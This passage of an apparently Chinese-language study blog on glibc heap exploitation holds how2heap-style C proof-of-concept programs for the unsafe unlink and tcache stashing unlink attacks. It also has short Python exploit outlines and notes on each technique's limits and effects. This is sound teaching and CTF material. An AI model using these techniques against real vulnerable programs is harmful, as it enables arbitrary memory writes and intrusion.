class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># chunk A</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">malloc(<span class="number">0x410</span>) <span class="comment"># chunk B</span></span><br><span class="line"><span class="comment">#This chunk should be smaller than [p1] and belong to the same large bin</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line"><span class="comment">#Allocate a chunk larger than [p1] to insert [p1] into large bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#Free the smaller of the two --&gt; [p2]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(target2-<span class="number">0x20</span>))</span><br><span class="line"><span class="comment">#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址</span></span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(recover)*<span class="number">2</span>) <span class="comment"># 修复large bin attack </span></span><br></pre></td></tr></table></figure><p><strong>修复:</strong><br>可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算</p><p><strong>限制:</strong></p><ul><li>需要一次UAF</li></ul><p><strong>效果:</strong></p><ul><li>在2.30以上可以在任意地址写入一个libc地址</li></ul><h2 id="unsafe-unlink">unsafe unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 0 ptr store in &amp;ptr</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># not in fastbin or tcache</span></span><br><span class="line">malloc(<span class="number">0x420</span>) </span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(&amp;ptr-<span class="number">0x18</span>)+p64(&amp;ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*k + p64(fake_prev_size)+p64(size)) <span class="comment"># fakesize = 0x420-0x10</span></span><br><span class="line"><span class="comment"># need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0</span></span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate</li><li>主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构</li></ul><p><strong>效果:</strong></p><ul><li>可以将ptr处地址改写为&amp;ptr-8</li></ul><h2 id="tcache-stashing-unlink">tcache stashing unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">calloc(<span class="number">0xa0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    calloc(<span class="number">0xa0</span>)</span><br><span class="line">    free(i)</span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 9 </span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 10</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">calloc(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 11</span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span 